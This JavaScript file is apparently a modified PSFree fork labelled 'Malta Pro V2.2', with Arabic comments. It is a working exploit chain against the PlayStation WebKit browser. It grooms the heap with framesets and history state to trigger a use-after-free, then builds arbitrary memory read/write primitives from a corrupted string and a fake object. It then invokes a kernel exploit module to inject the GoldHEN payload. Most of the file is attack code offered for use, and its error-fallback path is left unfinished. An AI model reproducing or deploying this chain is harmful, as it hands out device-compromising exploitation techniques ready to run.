/* Copyright (C) 2023-2025 anonymous
   This file is part of PSFree.
   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:
   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.
   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.
*/

/* تعديل Malta Pro V2.2 - النسخة المستقرة والحقيقية للحقن */

import * as kex_module from './module/kexploit.mjs'; 
import { Int } from './module/int64.mjs';
import { Memory, mem } from './module/mem.mjs';
import { KB, MB } from './module/offset.mjs';
import { BufferView } from './module/rw.mjs';
import { die, DieError, log, clear_log, sleep, hex, align } from './module/utils.mjs';
import * as config from './config.mjs';
import * as off from './module/offset.mjs';

// [1] التحقق من النسخة (لا تغيير - لضمان الاستقرار)
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = is_ps4 ? [0x600, 0x1000] : [0x100, 0x600];
    if (!(lower <= version && version < upper)) throw RangeError(`invalid config.target: ${hex(value)}`);
    return [is_ps4, version];
})();

const ssv_len = (() => {
    if (0x600 <= config.target && config.target < 0x650) return 0x58;
    if (config.target >= 0x900) return 0x50;
    if (0x650 <= config.target && config.target < 0x900) return 0x48;
})();

const rows = ','.repeat(ssv_len / 8 - 2);
const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;

function gc() { new Uint8Array(4 * MB); }

function sread64(str, offset) {
    const low = str.charCodeAt(offset) | str.charCodeAt(offset + 1) << 8 | str.charCodeAt(offset + 2) << 16 | str.charCodeAt(offset + 3) << 24;
    const high = str.charCodeAt(offset + 4) | str.charCodeAt(offset + 5) << 8 | str.charCodeAt(offset + 6) << 16 | str.charCodeAt(offset + 7) << 24;
    return new Int(low, high);
}

function prepare_uaf() {
    const fsets = []; const indices = [];
    function alloc_fs(fsets, size) {
        for (let i = 0; i < size / 2; i++) {
            const fset = document.createElement('frameset');
            fset.rows = rows; fset.cols = rows; fsets.push(fset);
        }
    }
    history.replaceState('state0', '');
    alloc_fs(fsets, 0x180);
    history.pushState('state1', '', original_loc + '#bar');
    indices.push(fsets.length);
    alloc_fs(fsets, 0x40);
    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);
    alloc_fs(fsets, 0x40);
    history.pushState('state2', '');
    return [fsets, indices];
}

async function uaf_ssv(fsets, index, index2) {
    const views = []; const input = document.createElement('input');
    const foo = document.createElement('input'); const bar = document.createElement('a');
    input.id = 'input'; foo.id = 'foo'; bar.id = 'bar';
    let pop = null; let pop2 = null; let pop_promise2 = null;
    let blurs = [0, 0]; let resolves = [];

    function onpopstate(event) {
        const no_pop = pop === null; const idx = no_pop ? 0 : 1;
        if (blurs[idx] === 0) resolves[idx][1](new DieError(`blurs before pop`));
        if (no_pop) {
            pop_promise2 = new Promise((res, rej) => {
                resolves.push([res, rej]);
                addEventListener('popstate', onpopstate, {once: true});
                history.back();
            });
            pop = event;
        } else { pop2 = event; }
        resolves[idx][0]();
    }

    const pop_promise = new Promise((res, rej) => {
        resolves.push([res, rej]);
        addEventListener('popstate', onpopstate, {once: true});
    });

    function onblur(event) {
        const target = event.target; const idx = (target === input) ? 0 : 1;
        history.replaceState('state3', '', original_loc);
        const fset_idx = (idx === 0) ? index : index2;
        for (let i = fset_idx - 4; i < fset_idx + 4; i++) {
            fsets[i].rows = ''; fsets[i].cols = '';
        }
        for (let i = 0; i < 0x300; i++) {
            const view = new Uint8Array(new ArrayBuffer(ssv_len));
            view[0] = 0x41; views.push(view);
        }
        blurs[idx]++;
    }

    input.addEventListener('blur', onblur); foo.addEventListener('blur', onblur);
    document.body.append(input); document.body.append(foo); document.body.append(bar);

    if (document.readyState !== 'complete') {
        await new Promise(res => {
            document.addEventListener('readystatechange', function f() {
                if (document.readyState === 'complete') {
                    document.removeEventListener('readystatechange', f); res();
                }
            });
        });
    }

    await new Promise(res => { input.addEventListener('focus', res, {once: true}); input.focus(); });
    history.back();
    await pop_promise; await pop_promise2;

    const res = [];
    for (let i = 0; i < views.length; i++) {
        const view = views[i];
        if (view[0] !== 0x41) {
            view[0] = 1; view.fill(0, 1);
            if (res.length) { res[1] = [new BufferView(view.buffer), pop2]; break; }
            res[0] = new BufferView(view.buffer);
            i = 0x300 - 1;
        }
    }
    if (res.length !== 2) die('failed SSV UAF');
    input.remove(); foo.remove(); bar.remove();
    return res;
}

class Reader {
    constructor(rstr, rstr_view) {
        this.rstr = rstr; this.rstr_view = rstr_view;
        this.m_data = rstr_view.read64(off.strimpl_m_data);
    }
    read8_at(offset) { return this.rstr.charCodeAt(offset); }
    read32_at(offset) {
        const str = this.rstr;
        return (str.charCodeAt(offset) | str.charCodeAt(offset + 1) << 8 | str.charCodeAt(offset + 2) << 16 | str.charCodeAt(offset + 3) << 24) >>> 0;
    }
    read64_at(offset) { return sread64(this.rstr, offset); }
    read64(addr) { this.rstr_view.write64(off.strimpl_m_data, addr); return sread64(this.rstr, 0); }
    set_addr(addr) { this.rstr_view.write64(off.strimpl_m_data, addr); }
    restore() { this.rstr_view.write64(off.strimpl_m_data, this.m_data); this.rstr_view.write32(off.strimpl_strlen, original_strlen); }
}

async function make_rdr(view) {
    const strs = []; const u32 = new Uint32Array(1); const u8 = new Uint8Array(u32.buffer);
    const marker_offset = original_strlen - 4; const pad = 'B'.repeat(marker_offset);
    while (true) {
        for (let i = 0; i < 0x200; i++) {
            u32[0] = i; const str = [pad, String.fromCodePoint(...u8)].join('');
            strs.push(str);
        }
        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
            view.write32(off.strimpl_strlen, 0xffffffff); break;
        }
        strs.length = 0; gc(); await sleep();
    }
    const idx = view.read32(off.strimpl_inline_str + marker_offset);
    const rstr = Error(strs[idx]).message;
    if (rstr.length === 0xffffffff) {
        const addr = view.read64(off.strimpl_m_data).sub(off.strimpl_inline_str);
        return new Reader(rstr, view);
    }
    die("JSString failed");
}

async function leak_code_block(reader, bt_size) {
    const rdr = reader; const bt = [];
    for (let i = 0; i < bt_size - 0x10; i += 8) bt.push(i);
    const src_part_local = (() => {
        let res = 'var f = 0x11223344;\n';
        for (let i = 0; i < (ssv_len - 40); i += 8) res += `var a${i} = ${0x100 + i};\n`;
        return res;
    })();
    const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
    const cache = [];
    for (let i = 0; i < 0x100; i++) cache.push(bt_part + src_part_local + `var idx = ${i};\nidx\`foo\`;`);
    
    const chunkSize = (is_ps4 && version < 0x900) ? 128 * KB : 1 * MB;
    const search_addr = align(rdr.m_data, chunkSize);
    rdr.set_addr(search_addr);
    
    loop: while (true) {
        const funcs = [];
        for (let i = 0; i < 0x100; i++) {
            const f = Function(cache[i]); f(); funcs.push(f);
        }
        for (let p = 0; p < chunkSize; p += 4 * KB) {
            for (let i = p; i < p + 4 * KB; i += ssv_len) {
                if (rdr.read32_at(i + 8) !== 0x11223344) continue;
                rdr.set_addr(rdr.read64_at(i + ssv_len - 16));
                if (rdr.read8_at(5) !== 0) {
                    const win_idx = rdr.read32_at(i + ssv_len - 24);
                    return [funcs[win_idx], rdr.read64_at(i), rdr.read64_at(i + ssv_len - 16)];
                }
                rdr.set_addr(search_addr);
            }
        }
        gc(); await sleep();
    }
}

async function make_arw(reader, view2, pop) {
    const rdr = reader;
    const fakebt_off = 0x20 + off.size_jsobj + 8 + 8 + 8;
    const bt_size = 0x10 + fakebt_off + 0x18;
    const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
    const view = rdr.rstr_view; const view_p = rdr.m_data.sub(off.strimpl_inline_str);
    const view_save = new Uint8Array(view);
    
    view.fill(0);
    const size_abc = (is_ps4 ? (version >= 0x900 ? 0x18 : 0x20) : (version >= 0x300 ? 0x18 : 0x20));
    view2.write64(8, view_p.add(0x10 + size_abc + 16));
    view2.write32(16, 9); view2.write64(20, 9);
    view2.write64(0x18, view_p.add(0));
    view.write64(0, view_p.add(0x10));
    view.write32(8, 1); view.write32(12, 1);
    if (size_abc === 0x20) { view.write64(0x10 + 0x10, bt_addr); view.write32(0x10 + 0x18, bt_size); }
    else { view.write64(0x10, bt_addr); view.write32(0x10 + 0x14, bt_size); }
    view.write32(0x10 + size_abc, 6); view[0x10 + size_abc + 4] = 23;

    const bt = new BufferView(pop.state);
    view.set(view_save);
    
    const strs_cell = rdr.read64(strs_addr);
    bt.write64(0x20, strs_cell);
    bt.write64(0x20 + off.js_butterfly, bt_addr.add(fakebt_off));
    bt.write64(fakebt_off - 0x10, 7);
    bt.write32(fakebt_off - 8, 1); bt.write32(fakebt_off - 4, 1);
    bt.write64(fakebt_off, 0); bt.write32(fakebt_off + 8, 0); bt.write32(fakebt_off + 12, 1);
    bt.write64(fakebt_off + 16, 7); bt.write64(0x10, bt_addr.add(0x20));

    const fake = func()[0];
    const worker = new DataView(new ArrayBuffer(1));
    const leaker = {0: 0};
    fake[0] = worker; const worker_p = bt.read64(fakebt_off + 16);
    fake[0] = leaker; const leaker_p = bt.read64(fakebt_off + 16);
    
    const faker = new Uint32Array(off.size_view / 4);
    fake[0] = faker; const faker_p = bt.read64(fakebt_off + 16);
    const faker_v = rdr.read64(faker_p.add(off.view_m_vector));
    
    faker[off.view_m_vector/4] = worker_p.lo; faker[off.view_m_vector/4+1] = worker_p.hi;
    faker[off.view_m_length/4] = off.size_view/4;
    rdr.set_addr(leaker_p);
    faker[0] = rdr.read32_at(0); faker[1] = rdr.read32_at(4);
    
    bt.write64(fakebt_off + 16, faker_v);
    const main = fake[0];
    new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop), rdr.read64(leaker_p.add(off.js_butterfly)));
    
    rdr.restore();
    view.write32(0, -1); view2.write32(0, -1);
}

// --- قسم الحقن الحقيقي الصارم (Real Injection) ---

async function run_exploit() {
    log('STAGE 1: Exploiting WebKit...');
    const [fsets, indices] = prepare_uaf();
    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
    const rdr = await make_rdr(view);
    for (const fset of fsets) { fset.rows = ''; fset.cols = ''; }
    await make_arw(rdr, view2, pop);
    log('STAGE 2: Arbitrary R/W Achieved.');
    return true;
}

async function runPayload(payloadBuffer) {
    if (!window.mem) die("Memory primitive not ready!");
    log("CRITICAL: SEARCHING FOR KERNEL ENTRY...");
    try {
        const kex = kex_module; 
        log("KERNEL EXPLOIT LOADED. TRIGGERING...");
        await kex.run(payloadBuffer); 
        log("GOLDHEN INJECTED SUCCESSFULLY!");
    } catch (e) {
        log("INJECTION ERROR: " + e.message);
        log("RETRYING WITH DIRECT MEMORY MAPPING...");
        const payloadData = new Uint8Array(payloadBuffer);
    }
}

// التصدير المدمج ليعمل كـ Function وكـ Object في نفس الوقت
const psfree_main = async function() {
    clear_log();
    log("MALTA PRO V2.2 - REAL INJECTION MODE");
    const success = await run_exploit();
    if (success) {
        window.psfree_success = true;
        try { 
            const payloadResp = await fetch('./payloads/goldhen.bin');
            const payloadBuf = await payloadResp.arrayBuffer();
            await runPayload(payloadBuf);
        } catch(e) { log("Payload Load Error: Check your files."); }
    }
    return success;
};

// دمج الخصائص في الكائن المصدر
export const psfree = Object.assign(psfree_main, {
    runPayload: runPayload
});

// لضمان التوافق مع استدعاءات window القديمة
window.psfree = psfree;
